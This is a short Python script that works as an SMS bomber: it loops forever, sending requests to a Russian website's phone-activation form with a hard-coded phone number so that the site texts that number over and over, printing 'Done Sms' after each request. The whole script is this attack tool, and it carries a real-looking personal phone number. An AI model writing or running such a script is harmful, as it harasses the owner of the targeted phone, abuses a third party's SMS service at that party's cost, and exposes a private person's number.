import argparse
import requests, json
import sys
import time
from sys import argv
import os
from colorama import Fore, Style


def menu(): 
 api = "https://www.ufamama.ru/Auth/ActivationByPhoneForm?phone=%2B79016929013"
 data = requests.get(api);
 print(Fore.RED+"Done Sms"+Fore.WHITE+"...");
 time.sleep(0.7);
 menu();
menu();
